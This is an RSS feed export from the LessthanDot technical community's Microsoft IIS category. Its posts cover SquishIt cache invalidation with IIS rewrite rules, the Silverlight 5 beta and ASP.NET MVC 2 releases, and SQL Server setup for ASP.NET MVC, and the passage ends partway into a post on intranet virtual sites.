@@ -1,0 +1,475 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Microsoft IIS &#8211; LessthanDot</title>
+	<atom:link href="/index.php/category/webdev/serveradmin/msiis/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>A Technical Community for IT Professionals</description>
+	<lastBuildDate>Sat, 09 Mar 2019 12:50:36 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.6.1</generator>
+	<item>
+		<title>Using IIS Rewrite Rules With SquishIt Cache Invalidation</title>
+		<link>/index.php/webdev/serverprogramming/using-iis-rewrite-rules-to-improve/</link>
+		<comments>/index.php/webdev/serverprogramming/using-iis-rewrite-rules-to-improve/#respond</comments>
+		<pubDate>Sat, 03 Aug 2013 13:32:00 +0000</pubDate>
+		<dc:creator><![CDATA[Alex Ullrich]]></dc:creator>
+				<category><![CDATA[ASP.NET]]></category>
+		<category><![CDATA[Microsoft IIS]]></category>
+		<category><![CDATA[Server Programming]]></category>
+		<category><![CDATA[asp.net]]></category>
+		<category><![CDATA[squishit]]></category>
+
+		<guid isPermaLink="false">/index.php/2013/08/using-iis-rewrite-rules-to-improve/</guid>
+		<description><![CDATA[In version 0.9.2 and earlier, SquishIt had two options for handling browser cache invalidation.  The default behavior was to append the hash to the query string, and the other was to include the hash in the combined filename.  While both got the job don&#8230;]]></description>
+				<content:encoded><![CDATA[<p>In version 0.9.2 and earlier, SquishIt had two options for handling browser cache invalidation.  The default behavior was to append the hash to the query string, and the other was to include the hash in the combined filename.  While both got the job done, they both came with advantages and disadvantages.  This post will attempt to cover those while also introducing a third option that is available starting in version 0.9.3.</p>
+<h3>Querystring Invalidation</h3>
+<p>SquishIt&#8217;s default versioning behavior is to append the versioning hash to the URL of a combined file as a query string parameter.  So a bundle set up like this:</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="csharp"><thead><tr><td colspan="2"  class="head">C#</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+</pre></td><td class="de1"><pre class="de1">Bundle<span class="sy0">.</span><span class="me1">JavaScript</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="kw1">Add</span><span class="br0">&#40;</span><span class="st0">&quot;/assets/js/jquery_1.7.2.js&quot;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="kw1">Add</span><span class="br0">&#40;</span><span class="st0">&quot;/assets/js/minifyjs_test.js&quot;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="me1">ForceRelease</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="me1">Render</span><span class="br0">&#40;</span><span class="st0">&quot;/output/minifyjs_test_output.js&quot;</span><span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">Bundle.JavaScript()
+   .Add("/assets/js/jquery_1.7.2.js")
+   .Add("/assets/js/minifyjs_test.js")
+   .ForceRelease()
+   .Render("/output/minifyjs_test_output.js")</pre></div></div>
+
+<p>Would render a script tag like this:</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="html4strict"><thead><tr><td colspan="2"  class="head">HTML</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="sc2">&lt;<span class="kw2">script</span> <span class="kw3">type</span><span class="sy0">=</span><span class="st0">&quot;text/javascript&quot;</span> <span class="kw3">src</span><span class="sy0">=</span><span class="st0">&quot;/output/minifyjs_test_output.js?{hashKeyName}={invalidationHash}&quot;</span>&gt;&lt;<span class="sy0">/</span><span class="kw2">script</span>&gt;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">&lt;script type="text/javascript" src="/output/minifyjs_test_output.js?{hashKeyName}={invalidationHash}"&gt;&lt;/script&gt;</pre></div></div>
+
+<p>The main disadvantage of this is that it doesn&#8217;t work with all caching proxies, though it seems to be pretty consistently supported in modern browsers.  The advantage is that it only requires one set of combined files to be stored on the server.  This is usually the best choice for files served locally because it doesn&#8217;t require any cleanup of old files on the server.</p>
+<h3>Filename Invalidation</h3>
+<p>When using this strategy, hashes are written directly into the filename.  So a bundle set up like this:</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="csharp"><thead><tr><td colspan="2"  class="head">C#</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+</pre></td><td class="de1"><pre class="de1">Bundle<span class="sy0">.</span><span class="me1">JavaScript</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="kw1">Add</span><span class="br0">&#40;</span><span class="st0">&quot;/assets/js/jquery_1.7.2.js&quot;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="kw1">Add</span><span class="br0">&#40;</span><span class="st0">&quot;/assets/js/minifyjs_test.js&quot;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="me1">ForceRelease</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="me1">Render</span><span class="br0">&#40;</span><span class="st0">&quot;/output/minifyjs_test_output#.js&quot;</span><span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">Bundle.JavaScript()
+   .Add("/assets/js/jquery_1.7.2.js")
+   .Add("/assets/js/minifyjs_test.js")
+   .ForceRelease()
+   .Render("/output/minifyjs_test_output#.js")</pre></div></div>
+
+<p>Would render a script tag like this:</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="html4strict"><thead><tr><td colspan="2"  class="head">HTML</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="sc2">&lt;<span class="kw2">script</span> <span class="kw3">type</span><span class="sy0">=</span><span class="st0">&quot;text/javascript&quot;</span> <span class="kw3">src</span><span class="sy0">=</span><span class="st0">&quot;/output/minifyjs_test_output{invalidationHash}.js&quot;</span>&gt;&lt;<span class="sy0">/</span><span class="kw2">script</span>&gt;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">&lt;script type="text/javascript" src="/output/minifyjs_test_output{invalidationHash}.js"&gt;&lt;/script&gt;</pre></div></div>
+
+<p>The main disadvantage of this strategy is that it tends to accumulate files over time. Because the hash is generated off of the combined file&#8217;s contents, every time a bundled script file or stylesheet changes, a new combined file is created. It eventually becomes necessary to clean this stuff up (The easiest way is to delete all files and reset the app pool, otherwise its usually safe to delete all but the most recent version for each combined file). The main advantage is that it is supported by all caching proxies &#8211; this consistent behavior makes it a good choice for CDN environments where you typically need to manage multiple versions of files anyway.</p>
+<h3>Folder Invalidation</h3>
+<p>This new strategy is similar to the filename invalidation strategy when it comes to output file naming, but behaves more like querystring invalidation in terms of disk footprint.  It is used similarly to the hash in filename option, in that you simply put a hash symbol in the path where you want the content&#8217;s hash to show up.  Unlike the hash in filename method, it requires you to use it explicitly because we need to be able to figure out the right folder to write files to.  So a bundle set up like this:</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="csharp"><thead><tr><td colspan="2"  class="head">C#</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+</pre></td><td class="de1"><pre class="de1">Bundle<span class="sy0">.</span><span class="me1">JavaScript</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="kw1">Add</span><span class="br0">&#40;</span><span class="st0">&quot;/assets/js/jquery_1.7.2.js&quot;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="kw1">Add</span><span class="br0">&#40;</span><span class="st0">&quot;/assets/js/minifyjs_test.js&quot;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="me1">WithCacheInvalidationStrategy</span><span class="br0">&#40;</span><span class="kw3">new</span> HashAsVirtualDirectoryCacheInvalidationStrategy<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="me1">ForceRelease</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
+&nbsp; &nbsp;<span class="sy0">.</span><span class="me1">Render</span><span class="br0">&#40;</span><span class="st0">&quot;/output/#/minifyjs_test_output.js&quot;</span><span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">Bundle.JavaScript()
+   .Add("/assets/js/jquery_1.7.2.js")
+   .Add("/assets/js/minifyjs_test.js")
+   .WithCacheInvalidationStrategy(new HashAsVirtualDirectoryCacheInvalidationStrategy())
+   .ForceRelease()
+   .Render("/output/#/minifyjs_test_output.js")</pre></div></div>
+
+<p>Would render a script tag like this:</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="html4strict"><thead><tr><td colspan="2"  class="head">HTML</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="sc2">&lt;<span class="kw2">script</span> <span class="kw3">type</span><span class="sy0">=</span><span class="st0">&quot;text/javascript&quot;</span> <span class="kw3">src</span><span class="sy0">=</span><span class="st0">&quot;/output/{invalidationHash}/minifyjs_test_output.js&quot;</span>&gt;&lt;<span class="sy0">/</span><span class="kw2">script</span>&gt;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">&lt;script type="text/javascript" src="/output/{invalidationHash}/minifyjs_test_output.js"&gt;&lt;/script&gt;</pre></div></div>
+
+<p>From looking at these URLs it is clear that caching agents will handle this the same way they handled the URLs built with the filename invalidation strategy.  But the strategy actually scrubs the hash from the disk location for the bundle, meaning that only one file is generated.  We can then set up a rewrite rule to scrub the hash out of the URL for incoming requests like so.</p>
+<p>So for IIS we could do something like this in our web.config:</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="xml"><thead><tr><td colspan="2"  class="head">XML</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="de1"><pre class="de1">&nbsp; <span class="sc3"><span class="re1">&lt;system.webServer<span class="re2">&gt;</span></span></span>
+&nbsp; &nbsp; <span class="sc-1">&lt;!-- snip --&gt;</span>
+&nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;rewrite<span class="re2">&gt;</span></span></span>
+&nbsp; &nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;rules<span class="re2">&gt;</span></span></span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;rule</span> <span class="re0">name</span>=<span class="st0">&quot;squishit&quot;</span><span class="re2">&gt;</span></span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;match</span> <span class="re0">url</span>=<span class="st0">&quot;([S]+)(/r-[w]+/)([S]+)&quot;</span> &nbsp;<span class="re2">/&gt;</span></span>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;action</span> <span class="re0">type</span>=<span class="st0">&quot;Rewrite&quot;</span> <span class="re0">url</span>=<span class="st0">&quot;{R:1}/{R:3}&quot;</span> <span class="re2">/&gt;</span></span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;/rule<span class="re2">&gt;</span></span></span>
+&nbsp; &nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;/rules<span class="re2">&gt;</span></span></span>
+&nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;/rewrite<span class="re2">&gt;</span></span></span>
+&nbsp; <span class="sc3"><span class="re1">&lt;/system.webServer<span class="re2">&gt;</span></span></span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">  &lt;system.webServer&gt;
+    &lt;!-- snip --&gt;
+    &lt;rewrite&gt;
+      &lt;rules&gt;
+        &lt;rule name="squishit"&gt;
+          &lt;match url="([S]+)(/r-[w]+/)([S]+)"  /&gt;
+          &lt;action type="Rewrite" url="{R:1}/{R:3}" /&gt;
+        &lt;/rule&gt;
+      &lt;/rules&gt;
+    &lt;/rewrite&gt;
+  &lt;/system.webServer&gt;</pre></div></div>
+
+<p>To configure these options globally we can add the following in Application_Start:</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="csharp"><thead><tr><td colspan="2"  class="head">C#</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1">Bundle<span class="sy0">.</span><span class="me1">ConfigureDefaults</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">.</span><span class="me1">UseCacheInvalidationStrategy</span><span class="br0">&#40;</span><span class="kw3">new</span> HashAsVirtualDirectoryCacheInvalidationStrategy<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span> </pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">Bundle.ConfigureDefaults().UseCacheInvalidationStrategy(new HashAsVirtualDirectoryCacheInvalidationStrategy()); </pre></div></div>
+
+<p>This will result in the supplied strategy being used for all bundles <strong>unless</strong> you override on a bundle using the method shown above.</p>
+<p>The end result combines the advantages of querystring invalidation and filename invalidation for what should be a minimal performance hit.  Hopefully this comes in handy in the future.</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/webdev/serverprogramming/using-iis-rewrite-rules-to-improve/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Silverlight 5 Beta Is Available For Download</title>
+		<link>/index.php/webdev/serverprogramming/silverlight-5-beta-is-available/</link>
+		<comments>/index.php/webdev/serverprogramming/silverlight-5-beta-is-available/#respond</comments>
+		<pubDate>Wed, 13 Apr 2011 14:47:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[AJAX]]></category>
+		<category><![CDATA[Javascript]]></category>
+		<category><![CDATA[Microsoft IIS]]></category>
+		<category><![CDATA[Server Programming]]></category>
+		<category><![CDATA[XHTML and CSS]]></category>
+		<category><![CDATA[silverlight]]></category>
+
+		<guid isPermaLink="false">/index.php/2011/04/silverlight-5-beta-is-available/</guid>
+		<description><![CDATA[Silverlight 5 Beta is available for download
+
+
+These are the top beta features
+
+
+
+  XAML Debugging with breakpoints for binding debugging
+
+  Implicit data templates for easy UI reuse
+
+  Double (and multi) click support
+
+  GPU-accelerated XN&#8230;]]></description>
+				<content:encoded><![CDATA[<p>Silverlight 5 Beta is available for download</p>
+<p>These are the top beta features</p>
+<ul>
+<li>XAML Debugging with breakpoints for binding debugging</li>
+<li>Implicit data templates for easy UI reuse</li>
+<li>Double (and multi) click support</li>
+<li>GPU-accelerated XNA-compatible 3D and immediate-mode 2D API</li>
+<li>Low-latency sound effects and WAV support</li>
+<li>Real operating system windows and multi-display support</li>
+<li>Significant performance improvements, fixes and much more</li>
+</ul>
+<p>More info about new features here: http://www.microsoft.com/silverlight/future/</p>
+<p>There are also these items for download </p>
+<ul>
+<li>Silverlight 5 Beta Tools for Visual Studio SP1 (required)</li>
+<li>Expression Blend Preview for Silverlight 5 (optional)</li>
+<li>Silverlight 5 Features Document (optional)</li>
+</ul>
+<p>Download Silverlight 5 Beta and the optional downloads here: http://www.silverlight.net/getstarted/silverlight-5-beta/</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/webdev/serverprogramming/silverlight-5-beta-is-available/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>ASP.NET MVC 2 RTM for Visual Studio 2008 SP1 Released</title>
+		<link>/index.php/webdev/webdesigngraphicsstyling/asp-net-mvc-2-rtm-for-visual-studio-2008/</link>
+		<comments>/index.php/webdev/webdesigngraphicsstyling/asp-net-mvc-2-rtm-for-visual-studio-2008/#respond</comments>
+		<pubDate>Thu, 11 Mar 2010 13:11:26 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[AJAX]]></category>
+		<category><![CDATA[ASP.NET]]></category>
+		<category><![CDATA[Javascript]]></category>
+		<category><![CDATA[Microsoft IIS]]></category>
+		<category><![CDATA[Web Design, Graphics and Styling]]></category>
+		<category><![CDATA[XHTML and CSS]]></category>
+		<category><![CDATA[ajax]]></category>
+		<category><![CDATA[asp.net]]></category>
+		<category><![CDATA[asp.net mvc]]></category>
+		<category><![CDATA[iis]]></category>
+		<category><![CDATA[mvc]]></category>
+
+		<guid isPermaLink="false">/index.php/2010/03/asp-net-mvc-2-rtm-for-visual-studio-2008/</guid>
+		<description><![CDATA[Microsoft has released ASP.NET MVC 2 RTM for Visual Studio 2008 SP1. Note Because Visual Studio 2008 and Visual Studio 2010 RC share a component of ASP.NET MVC 2, installing the ASP.NET MVC 2 RTM release on a computer where Visual Studio 2010 RC is also installed is not supported. New Features in ASP.NET MVC [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>Microsoft has released ASP.NET MVC 2 RTM for Visual Studio 2008 SP1.</p>
+<p><em>Note   Because Visual Studio 2008 and Visual Studio 2010 RC share a component of ASP.NET MVC 2, installing the ASP.NET MVC 2 RTM release on a computer where Visual Studio 2010 RC is also installed is not supported.</em></p>
+<p><strong>New Features in ASP.NET MVC 2 RTM</strong><br />
+The following features are new since the RC release of ASP.NET MVC 2.<br />
+Templated Helpers Allow You to Specify Extra View Data<br />
+ASP.NET MVC 2 now includes new overloads of the EditorFor and DisplayFor methods. These overloads contain a parameter that accepts an anonymous object that can be used to provide extra view data. The view data provided in this parameter is merged with any existing view data that is passed to the template.</p>
+<p>ASP.NET MVC 2 RTM for Visual Studio 2008 SP1 can be downloaded from the following page: http://go.microsoft.com/fwlink/?LinkID=157074</p>
+<p>Make sure to also download and read ASP.NET-MVC-2-RTM-Release-Notes.doc. This document has the release notes and the know issues.</p>
+<p>To learn how to upgrade an ASP.NET MVC 1.0 application to ASP.NET MVC 2 in Visual Studio 2008 SP1 visit this link: http://www.asp.net/learn/whitepapers/aspnet-mvc2-upgrade-notes/</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/webdev/webdesigngraphicsstyling/asp-net-mvc-2-rtm-for-visual-studio-2008/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Setting up SQL Server with ASP.NET MVC</title>
+		<link>/index.php/webdev/serveradmin/msiis/setting-up-sql-server-with-asp-net-mvc/</link>
+		<comments>/index.php/webdev/serveradmin/msiis/setting-up-sql-server-with-asp-net-mvc/#comments</comments>
+		<pubDate>Sun, 17 Jan 2010 12:18:28 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[ASP.NET]]></category>
+		<category><![CDATA[Microsoft IIS]]></category>
+		<category><![CDATA[asp.net mvc]]></category>
+		<category><![CDATA[sql server 2008]]></category>
+
+		<guid isPermaLink="false">/index.php/2010/01/setting-up-sql-server-with-asp-net-mvc/</guid>
+		<description><![CDATA[If you download ASP.NET MVC from Microsoft, install it and create a MVC website you might run into a couple of gotchas in regards to the database. First of all ASP.NET MVC use SQL Server Express by default in the connection string. So if you were to run your ASP.NET MVC website, then clicking on [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>If you download <a href="http://www.asp.net/mvc/">ASP.NET MVC</a> from Microsoft, install it and create a MVC website you might run into a couple of gotchas in regards to the database. First of all ASP.NET MVC use SQL Server Express by default in the connection string. So if you were to run your ASP.NET MVC website, then clicking on login you would get this error:</p>
+<p><em><span class="MT_smaller">A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 26 &#8211; Error Locating Server/Instance Specified</span>)</em></p>
+<p>A little more info below that error will tell you that it is trying to create a SQL Server Express database. Here is that info</p>
+<p><em><span class="MT_smaller">SQLExpress database file auto-creation error: </p>
+<p>The connection string specifies a local Sql Server Express instance using a database location within the applications App_Data directory. The provider attempted to automatically create the application services database because the provider determined that the database does not exist. The following configuration requirements are necessary to successfully check for existence of the application services database and automatically create the application services database:</p>
+<p>If the applications App_Data directory does not already exist, the web server account must have read and write access to the applications directory. This is necessary because the web server account will automatically create the App_Data directory if it does not already exist.</p>
+<p>If the applications App_Data directory already exists, the web server account only requires read and write access to the applications App_Data directory. This is necessary because the web server account will attempt to verify that the Sql Server Express database already exists within the applications App_Data directory. Revoking read access on the App_Data directory from the web server account will prevent the provider from correctly determining if the Sql Server Express database already exists. This will cause an error when the provider attempts to create a duplicate of an already existing database. Write access is required because the web server accounts credentials are used when creating the new database.</p>
+<p>Sql Server Express must be installed on the machine.<br />
+The process identity for the web server account must have a local user profile. See the readme document for details on how to create a local user profile for both machine and domain accounts.</span></em></p>
+<p>So I don&#8217;t have the Express version of SQL Server on my machine. The first thing I have to do is open the Web.config file and change the connection string from this</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="xml"><thead><tr><td colspan="2"  class="head">XML</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+</pre></td><td class="de1"><pre class="de1"><span class="sc3"><span class="re1">&lt;connectionStrings<span class="re2">&gt;</span></span></span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;add</span> <span class="re0">name</span>=<span class="st0">&quot;ApplicationServices&quot;</span> </span>
+<span class="sc3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="re0">connectionString</span>=<span class="st0">&quot;data source=.SQLEXPRESS;Integrated Security=SSPI;AttachDBFilename=|DataDirectory|aspnetdb.mdf;</span></span>
+<span class="sc3"><span class="st0">&nbsp; &nbsp; &nbsp; &nbsp; User Instance=true&quot;</span> <span class="re0">providerName</span>=<span class="st0">&quot;System.Data.SqlClient&quot;</span><span class="re2">/&gt;</span></span>
+&nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;/connectionStrings<span class="re2">&gt;</span></span></span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">&lt;connectionStrings&gt;
+		&lt;add name="ApplicationServices" 
+			connectionString="data source=.SQLEXPRESS;Integrated Security=SSPI;AttachDBFilename=|DataDirectory|aspnetdb.mdf;
+		User Instance=true" providerName="System.Data.SqlClient"/&gt;
+	&lt;/connectionStrings&gt;</pre></div></div>
+
+<p>to this</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="xml"><thead><tr><td colspan="2"  class="head">XML</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+</pre></td><td class="de1"><pre class="de1"><span class="sc3"><span class="re1">&lt;connectionStrings<span class="re2">&gt;</span></span></span>
+&nbsp; &nbsp; &nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;add</span> <span class="re0">name</span>=<span class="st0">&quot;ApplicationServices&quot;</span> </span>
+<span class="sc3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="re0">connectionString</span>=<span class="st0">&quot;data source=.;Integrated Security=SSPI;Initial Catalog=aspnetdb&quot;</span><span class="re2">/&gt;</span></span>
+&nbsp; &nbsp; <span class="sc3"><span class="re1">&lt;/connectionStrings<span class="re2">&gt;</span></span></span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">&lt;connectionStrings&gt;
+		&lt;add name="ApplicationServices" 
+			connectionString="data source=.;Integrated Security=SSPI;Initial Catalog=aspnetdb"/&gt;
+	&lt;/connectionStrings&gt;</pre></div></div>
+
+<p>Now let&#8217;s try again by clicking on the login page. Still a problem for me, now I get the following error</p>
+<p><strong>Cannot open database &#8220;aspnetdb&#8221; requested by the login. The login failed.<br />
+Login failed for user &#8216;Denis-PCDenis&#8217;.</strong></p>
+<p>Okay this makes sense since I don&#8217;t have this database, I need to create it. There are 2 ways you can do this. Either navigate to C:WindowsMicrosoft.NETFrameworkv2.0.50727 and execute aspnet_regsql.exe or run the Visual Studio command prompt.</p>
+<p>Start &#8211;> All Programs &#8211;> Microsoft Visual Studio 2008 &#8211;> Visual Studio Tools &#8211;> Visual Studio 2008 Command Prompt</p>
+<p>After the Visual Studio Command Prompt is up type aspnet_regsq and hit enter</p>
+<p>Below is a screenshot of what it looks like if you run it from the command prompt</p>
+<div class="image_block"><img src="/wp-content/uploads/blogs/WebDev//Setup1.png" alt="" title="" width="678" height="399" /></div>
+<p>Click Next on the first screen of the wizard, this will bring you to the screen shown below</p>
+<div class="image_block"><img src="/wp-content/uploads/blogs/WebDev//Setup2.png" alt="" title="" width="579" height="450" /></div>
+<p>Leave the top option selected and click Next, this will bring you to the screen shown below</p>
+<div class="image_block"><img src="/wp-content/uploads/blogs/WebDev//Setup3.png" alt="" title="" width="588" height="454" /></div>
+<p>In the Server field type your SQL Server name or type a dot if it is on your local server, type a username and password if you use sql authentication or select windows authentication  if you use that. Leave the last option as it is and click Next. Now you will see a summary screen, click Next on the summary screen and then if everything went as it should you should see a Database has been created or modified screen, click finish to exit the wizard.</p>
+<p>Now you can go back to your ASP.NET MVC site, hit F5 in Visual Studio and click Log On, click on the register link, fill out the fields and you should see something like the screen below.</p>
+<div class="image_block"><img src="/wp-content/uploads/blogs/WebDev//Setup4.png" alt="" title="" width="553" height="300" /></div>
+<p>Congratulations, you have now completed a small step toward you first ASP.NET MVC site, you now have a functional site but you need to add Models, Controllers and Views.</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/webdev/serveradmin/msiis/setting-up-sql-server-with-asp-net-mvc/feed/</wfw:commentRss>
+		<slash:comments>4</slash:comments>
+		</item>
+		<item>
+		<title>Intranet Makeover: Virtual Web Sites with Custom DNS Names</title>
+		<link>/index.php/webdev/serveradmin/intranet-makeover/</link>
+		<comments>/index.php/webdev/serveradmin/intranet-makeover/#comments</comments>
+		<pubDate>Fri, 23 Oct 2009 13:22:46 +0000</pubDate>
+		<dc:creator><![CDATA[Erik]]></dc:creator>
+				<category><![CDATA[Microsoft IIS]]></category>
+		<category><![CDATA[Server Admin]]></category>
+
+		<guid isPermaLink="false">/index.php/2009/10/intranet-makeover/</guid>
+		<description><![CDATA[Why make your users interact with URLs such as: http://companyweb1/mainsite/repository/main.html when they could just type repository? The Mess Your corporate intranet probably has a lot of different resources on it. Wherever those are, users have to gain access to them somehow. And there are several issues that can reduce ease of access, whether the resources [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>Why make your users interact with URLs such as: <a href="/">http://companyweb1/mainsite/repository/main.html</a> when they could just type <a href="/">repository</a>?</p>
+<h2>The Mess</h2>
+<p>Your corporate intranet probably has a lot of different resources on it. Wherever those are, users have to gain access to them somehow. And there are several issues that can reduce ease of access, whether the resources are whole web sites or individual web pages.</p>
+<p>If resources are mainly grouped together on one site, then you have to deal with problems like:</p>
+<ul>
